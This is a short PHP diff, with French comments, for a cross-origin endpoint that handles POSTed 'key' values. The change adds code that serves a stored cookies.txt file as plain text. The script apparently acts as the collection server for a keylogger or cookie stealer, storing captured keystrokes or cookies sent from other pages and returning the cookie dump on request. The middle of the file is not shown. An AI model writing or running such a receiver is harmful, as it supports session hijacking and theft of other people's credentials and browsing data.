@@ -4,6 +4,7 @@
     header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
     header("Access-Control-Allow-Headers: Content-Type");
 
+    ob_start();
 
     // Vérifier si une donnée a été envoyée
     if (isset($_POST['key'])) {
@@ -29,4 +30,14 @@
         echo "No keys received!";
     }
     
+
+    $fichier = "cookies.txt";
+    if (file_exists($fichier)) {
+        header("Content-Type: text/plain; charset=UTF-8");
+        echo file_get_contents($fichier);
+    } else {
+        http_response_code(404);
+        echo "Erreur : fichier introuvable.";
+    }
+    ob_end_flush();
 ?>
